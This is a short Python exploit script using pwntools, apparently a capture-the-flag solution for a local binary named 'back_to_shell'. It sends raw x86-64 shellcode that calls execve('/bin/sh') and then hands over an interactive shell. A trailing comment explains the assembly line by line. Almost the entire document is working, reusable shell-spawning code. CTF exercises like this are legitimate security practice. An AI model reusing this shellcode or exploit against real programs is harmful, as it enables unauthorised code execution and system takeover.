from pwn import *

#r = gdb.debug("./back_to_shell", gdbscript='''
#continue
#              ''')

r = process("./back_to_shell")

input("wait")

r.sendline(b"\x48\x31\xFF\x48\x89\xC7\x48\x83\xC7\x16\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")

r.interactive()

'''
xor    rdi,rdi  
mov    rdi,rax      in rax there is the input, i move it in rdi to set the arg of the execve 
add    rdi,0x16     i sum 16 to the shellcode to have /bin/sh\x00 in rdi as arg of execve
xor    rax,rax
mov    rax,0x3b
syscall
'''